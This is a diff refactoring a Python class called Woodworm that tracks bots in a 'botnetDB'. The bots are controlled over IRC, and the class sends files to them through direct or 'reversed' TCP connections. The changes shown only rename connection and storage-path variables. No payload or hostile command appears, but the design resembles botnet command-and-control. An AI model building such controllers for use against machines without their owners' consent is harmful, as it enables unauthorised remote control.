@@ -85,11 +85,11 @@ class Woodworm:
         if self.botnetDB.get_bot(nick) is None:
             bot = context.Context(nick, ip, port)
             tcpClient = tcp_services.TCPClient(ip, port)
-            connection = await tcpClient.connect()
-            if connection is not None:
-                bot.set_tcp_connection(connection)
-                bot.get_tcp_connection().set_download_path(self.pathToFiles)
-                bot.get_tcp_connection().send_command(f"IDENTIFY: {self.ircNick}")
+            tcpSession = await tcpClient.connect()
+            if tcpSession is not None:
+                bot.set_tcp_session(tcpSession)
+                bot.get_tcp_session().get_data_link().set_download_path(self.pathToFiles)
+                bot.get_tcp_session().get_data_link().send_command(f"IDENTIFY: {self.ircNick}")
             else:
                 logging.error(f"Failed to TCP connect to bot: nick: {nick}, ip: {ip} port: {port}")
                                  
@@ -136,7 +136,7 @@ class Woodworm:
         filename = kwargs.get('filename')
         receiver = kwargs.get('receiver')
         nickname = kwargs.get('nickname')
-        file_path = os.path.join(self.storageDirectory, filename)
+        file_path = os.path.join(self.pathToFiles, filename)
 
         if not os.path.exists(file_path):
             await irc_connection.send_query(nickname, f"No such file: {filename}")
@@ -147,10 +147,13 @@ class Woodworm:
             await irc_connection.send_query(nickname, f"Bot {receiver} not found")
             return
 
-        connection = bot.get_tcp_connection()
-        if connection is None:
+        tcpSession = bot.get_tcp_session()
+
+        if tcpSession is None:
             logging.warning(f"Bot {receiver} has no connection, trying to use reversed connection")
             connection = bot.get_reversed_tcp_connection()
+        else:
+            connection = tcpSession.get_data_link()
         
         if connection is None:
             logging.error(f"Bot {receiver} has no active connections")
@@ -178,30 +181,33 @@ class Woodworm:
 
         for bot in self.botnetDB.get_bots().values():
             info = f"BOT: {bot.get_ircNick()} {bot.get_ip()}:{bot.get_port()}"
-            connection = bot.get_tcp_connection()
-            if connection is not None:
+            tcpSession = bot.get_tcp_session()
+            
+            if tcpSession is not None:
                 info += f" TCP connection: [active]"
             else:
                 info += f" TCP connection: [inactive]"
+            
             connection = bot.get_reversed_tcp_connection()
             if connection is not None:
                 info += f" Reversed TCP connection: [active]"
             else:
                 info += f" Reversed TCP connection: [inactive]"
+            
             await irc_connection.send_query(nickname, info)
 
 
     async def list_files(self):
         files = []
         try:
-            files = await asyncio.to_thread(os.listdir, self.storageDirectory)
+            files = await asyncio.to_thread(os.listdir, self.pathToFiles)
         except Exception as e:
             logging.error(f"Error listing files: {str(e)}")
         return files
 
 
     async def get_file_info(self, filename):
-        file_path = os.path.join(self.storageDirectory, filename)
+        file_path = os.path.join(self.pathToFiles, filename)
         try:
             file_size = os.path.getsize(file_path)
             file_modified = os.path.getmtime(file_path)
